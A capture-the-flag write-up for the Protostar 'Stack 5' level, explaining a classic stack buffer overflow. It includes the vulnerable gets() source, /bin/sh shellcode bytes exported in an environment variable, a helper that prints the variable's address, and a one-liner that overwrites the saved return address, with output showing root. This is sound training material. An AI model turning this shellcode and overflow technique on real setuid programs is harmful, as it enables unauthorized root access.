# Protostar - Stack 5

### About ###

>Stack5 is a standard buffer overflow, this time introducing shellcode.
>
>This level is at /opt/protostar/bin/stack5
>
> **Hints**

> - At this point in time, it might be easier to use someone elses shellcode
> - If debugging the shellcode, use \xcc (int3) to stop the program executing and return to the debugger
> - remove the int3s once your shellcode is done.


### Source code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

### Solution 

This time we can't use the `win` function, we will need to inject our own code into the process.

The shellcode we will use is available [here](http://shell-storm.org/shellcode/files/shellcode-585.php). We will use an environment variable to store our shellcode.

```
user@protostar:/tmp$ export SHELLCODE=$(python -c "print '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80'")
```

The following c program will give us the address of `SHELLCODE` in the stack.

```c
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char* argv[])
{
       	printf("%p\n", getenv(argv[1]));
       	return 0;
}
```

```
user@protostar:/tmp$ gcc -o getenv getenv.c
user@protostar:/tmp$ ./getenv SHELLCODE
0xbffff8b8
```

Now we can overwrite the saved `eip` with `0xbffff8b8` and get root access to the machine.

```
user@protostar:/tmp$ id
uid=1001(user) gid=1001(user) groups=1001(user)

user@protostar:/tmp$ (python -c "print 'A'*$((76))+'\xb8\xf8\xff\xbf'"; cat;) | /opt/protostar/bin/stack5
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
```